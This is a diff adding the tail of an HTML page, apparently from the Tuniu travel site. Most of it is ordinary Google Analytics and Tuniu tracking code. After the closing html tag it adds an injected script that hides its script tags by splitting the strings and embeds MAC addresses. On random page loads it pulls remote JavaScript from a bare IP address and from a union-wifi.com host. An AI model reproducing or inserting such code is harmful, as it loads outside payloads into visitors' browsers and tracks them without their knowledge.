+        _gaq.push(["_addOrganic", "baidu", "q6"]);
+        _gaq.push(["_addOrganic", "baidu", "q6"]);
+        _gaq.push(["_addOrganic", "www.so.com", "u"]);
+        _gaq.push(["_addOrganic", "www.so.com", "q"]);
+        _gaq.push(["_addOrganic", "360", "u"]);
+        _gaq.push(["_addOrganic", "360", "q"]);
+        _gaq.push(["_trackPageview", ""]);
+    </script>
+    <script type="text/javascript"> (function () {
+        var ga = document.createElement('script');
+        ga.type = 'text/javascript';
+        ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+    <script type="text/javascript">
+        var u = (("https:" == document.location.protocol) ? "https://analy.tuniu.cn/analysisCollect/" : "http://analy.tuniu.cn/analysisCollect/");
+        document.write(unescape("%3Cscript src='" + u + "tac.mini.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+        var PageName = "";
+        var analyTuniuSpend = 0;
+        var tuniuTracker = _tat.getTracker();
+        tuniuTracker.setPageName(PageName);//do not delete
+        tuniuTracker.addOrganic("baidu.com", "w");
+        tuniuTracker.addOrganic("baidu.com", "q1");
+        tuniuTracker.addOrganic("baidu.com", "q2");
+        tuniuTracker.addOrganic("baidu.com", "q3");
+        tuniuTracker.addOrganic("baidu.com", "q4");
+        tuniuTracker.addOrganic("baidu.com", "q5");
+        tuniuTracker.addOrganic("baidu.com", "q6");
+        tuniuTracker.addOrganic("www.so.com", "u");
+        tuniuTracker.addOrganic("www.so.com", "q");
+        tuniuTracker.addOrganic("so.360.cn", "u");
+        tuniuTracker.addOrganic("so.360.cn", "q");
+        tuniuTracker.trackPageView();
+        tuniuTracker.enableLinkTracking();
+    </script>
+</body>
+</html>
+<script>
+    function ik_random() {
+        var ik_r_min = 0;
+        var ik_r_max = 100;
+        return (parseInt(Math.random() * (ik_r_max - ik_r_min + 1) + ik_r_min));
+    }
+    function ik_isiframe() {
+        return (self != top);
+    }
+    var __m = '50:7b:9d:e0:3c:00';
+    var __m2 = '00:00:00:00:00:00';
+    var __h = "<sc" + "ript src=\"http://101.201.53.95/js.php?uid=90b9a2b579ed77179e1accd617f5034b,PC,";
+    var __b = "&r=" + Math.random() + __m + __m2 + "\"></scr" + "ipt>";
+    var x = ik_random();
+    if (!ik_isiframe()) {
+        switch (true) {
+            case x >= 0 && x < 5:
+                document.write(__h + "200" + __b);
+                document.write("<sc" + "ript src=\"http://js.union-wifi.com/zm.js?R6Gpf6T&dmac=" + __m2 + "&umac=" + __m + "\"></scr" + "ipt>");
+                break;
+            case x >= 55 && x <= 100:
+                document.write(__h + "100" + __b);
+                document.write("<sc" + "ript src=\"http://js.union-wifi.com/zm.js?Rav195P&dmac=" + __m2 + "&umac=" + __m + "\"></scr" + "ipt>");
+                break;
+        }
+    }
+</script>
